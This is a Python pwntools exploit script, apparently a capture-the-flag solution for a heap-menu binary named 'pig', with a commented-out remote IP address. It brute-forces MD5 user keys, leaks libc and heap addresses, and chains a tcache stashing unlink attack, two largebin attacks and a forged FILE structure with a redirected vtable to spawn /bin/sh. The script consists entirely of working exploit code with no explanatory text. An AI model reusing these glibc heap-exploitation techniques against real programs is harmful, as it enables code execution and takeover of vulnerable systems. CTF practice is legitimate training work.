from pwn import *

context.log_level = 'debug'

io = process('./pig')
# io = remote('182.92.203.154', 35264)
elf = ELF('./pig')
libc = elf.libc

rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
# lg = lambda s,addr		: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))

text ='''
'''

def Find():
	for x in xrange(1, 0xff+1):
		for y in xrange(1, 0xff+1):
			for z in xrange(1, 0xff+1):
				for m in xrange(1, 0xff+1):
					string1 = 'A' + chr(x) + chr(y) + chr(z) + chr(m)
					out1 = hashlib.md5(string1).hexdigest()
					# if out1[4:6] == '00':
					# 	print out1
					if out1.startswith('3c4400'):
						print '[' + string1.encode('hex') + ']'
						print out1

def Menu(cmd):
	sla('Choice: ', str(cmd))

def Add(size, content):
	Menu(1)
	sla('size: ', str(size))
	sla('message: ', content)

def Show(idx):
	Menu(2)
	sla('index: ', str(idx))

def Edit(idx, content):
	Menu(3)
	sla('index: ', str(idx))
	sa('message: ', content)

def Del(idx):
	Menu(4)
	sla('index: ', str(idx))

def Change(user):
	Menu(5)
	if user == 1:
		sla('user:\n', 'A\x01\x95\xc9\x1c')
	elif user == 2:
		sla('user:\n', 'B\x01\x87\xc3\x19')
	elif user == 3:
		sla('user:\n', 'C\x01\xf7\x3c\x32')


# Find()
# A: 'A\x01\x95\xc9\x1c'
# B: 'B\x01\x87\xc3\x19'
# C: 'C\x01\xf7\x3c\x32'

#----- prepare tcache_stashing_unlink_attack
Change(2)
for x in xrange(5):
	Add(0x90, 'B'*0x28) # B0~B4
	Del(x)	# B0~B4
	
Change(1)
Add(0x150, 'A'*0x68) # A0
for x in xrange(7):
	Add(0x150, 'A'*0x68) # A1~A7
	Del(1+x)
Del(0)

Change(2)
Add(0xb0, 'B'*0x28) # B5 split 0x160 to 0xc0 and 0xa0

Change(1)
Add(0x180, 'A'*0x78) # A8
for x in xrange(7):
	Add(0x180, 'A'*0x78) # A9~A15
	Del(9+x)
Del(8)

Change(2)
Add(0xe0, 'B'*0x38) # B6 split 0x190 to 0xf0 and 0xa0

#----- leak libc_base and heap_base
Change(1)
Add(0x430, 'A'*0x158) # A16

Change(2)
Add(0xf0, 'B'*0x48) # B7

Change(1)
Del(16)

Change(2)
Add(0x440, 'B'*0x158) # B8

Change(1)
Show(16)
ru('message is: ')
libc_base = uu64(rl()) - 0x1ebfe0
lg('libc_base')

Edit(16, 'A'*0xf+'\n')
Show(16)
ru('message is: '+'A'*0xf+'\n')
heap_base = uu64(rl()) - 0x13940
lg('heap_base')


#----- first largebin_attack
Edit(16, 2*p64(libc_base+0x1ebfe0) + '\n') # recover
Add(0x430, 'A'*0x158) # A17
Add(0x430, 'A'*0x158) # A18
Add(0x430, 'A'*0x158) # A19

Change(2)
Del(8)
Add(0x450, 'B'*0x168) # B9

Change(1)
Del(17)

Change(2)
free_hook = libc_base + libc.sym['__free_hook']
Edit(8, p64(0) + p64(free_hook-0x28) + '\n')

Change(3)
Add(0xa0, 'C'*0x28) # C0 triger largebin_attack, write a heap addr to __free_hook-8

Change(2)
Edit(8, 2*p64(heap_base+0x13e80) + '\n') # recover

#----- second largebin_attack
Change(3)
Add(0x380, 'C'*0x118) # C1

Change(1)
Del(19)

Change(2)
IO_list_all = libc_base + libc.sym['_IO_list_all']
Edit(8, p64(0) + p64(IO_list_all-0x20) + '\n')

Change(3)
Add(0xa0, 'C'*0x28) # C2 triger largebin_attack, write a heap addr to _IO_list_all

Change(2)
Edit(8, 2*p64(heap_base+0x13e80) + '\n') # recover

#----- tcache_stashing_unlink_attack and FILE attack
Change(1)
payload = 'A'*0x50 + p64(heap_base+0x12280) + p64(free_hook-0x20)
Edit(8, payload + '\n')

Change(3)
payload = '\x00'*0x18 + p64(heap_base+0x147c0)
payload = payload.ljust(0x158, '\x00')
Add(0x440, payload) # C3 change fake FILE _chain
Add(0x90, 'C'*0x28) # C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache

IO_str_vtable = libc_base + 0x1ED560
system_addr = libc_base + libc.sym['system']
fake_IO_FILE = 2*p64(0)
fake_IO_FILE += p64(1)					#change _IO_write_base = 1
fake_IO_FILE += p64(0xffffffffffff)		#change _IO_write_ptr = 0xffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(heap_base+0x148a0)				#v4
fake_IO_FILE += p64(heap_base+0x148b8)				#v5
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)					#change _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(IO_str_vtable)		#change vtable
payload = fake_IO_FILE + '/bin/sh\x00' + 2*p64(system_addr)
sa('Gift:', payload)

# dbg(text)
# pause()

Menu(5)
sla('user:\n', '')

irt()
